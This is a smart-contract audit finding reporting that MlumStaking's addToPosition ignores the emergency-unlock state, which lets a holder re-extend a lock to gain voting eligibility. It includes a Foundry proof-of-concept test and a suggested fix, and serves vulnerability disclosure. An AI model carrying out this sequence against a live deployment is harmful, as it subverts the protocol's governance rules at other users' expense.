# Users can extend current position's lock duration during emergency unlock

## Summary
`MlumStaking::addToPosition`  function does not check if the pool is unlocked, allowing users to deposit during the unlock period. Since the new lock duration is calculated based on the amount-weighted average time, users depositing a significant balance can extend the lock duration of their current position. This enables them to exercise privileges such as voting, which new protocol users cannot access, as the duration of newly created positions will be 0.
## Vulnerability Detail
Consider the following scenario:
- Alice creates a position, locking 21 days, 1 ether.
- After 2 weeks she adds some extra amount, let's say 1 wei so that the initial lock duration term does not contribute in the new lock period calculation. Now the lock period is 7 days.
- The admin sets the emergency lock, people can only create positions with null lock period.
- Alice wants to vote but the lock period is smaller than 14 days which is the minimum required. She adds another 1 ether to the position and is eligible to vote.
## Impact
See example in PoC:

Place in `MlumStaking.t.sol`.

```javascript
    function testExtendLockDuringUnlock() public {
        _stakingToken.mint(ALICE, 3 ether);

        // Initial lock
        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 3 ether + 1 wei);
        _pool.createPosition(1 ether, 21 days);
        vm.stopPrank();
        MlumStaking.StakingPosition memory position = _pool.getStakingPosition(
            1
        );
        assertEq(position.lockDuration, 21 days);
        // Adds some tokens, consequently lock duration is updated
        skip(14 days);
        vm.prank(ALICE);
        _pool.addToPosition(1, 1 wei);
        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 7 days);
        // Emergency lock
        vm.prank(DEV);
        _pool.setEmergencyUnlock(true);
        // Adds again some tokens even during the unlock to set the lock duration again to the minimum threshold required to vote
        vm.startPrank(ALICE);
        _pool.addToPosition(1, 1 ether + 1 wei);
        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 14 days);
    }
```

## Tool used

Manual Review

## Recommendation
Implement check for emergency unlock, in which case only users with a null initial lock duration should be able to add tokens to their positions:

```javascript
if (isUnlocked() && position.initialLockDuration != 0)
            revert("Pool Unlocked");
```
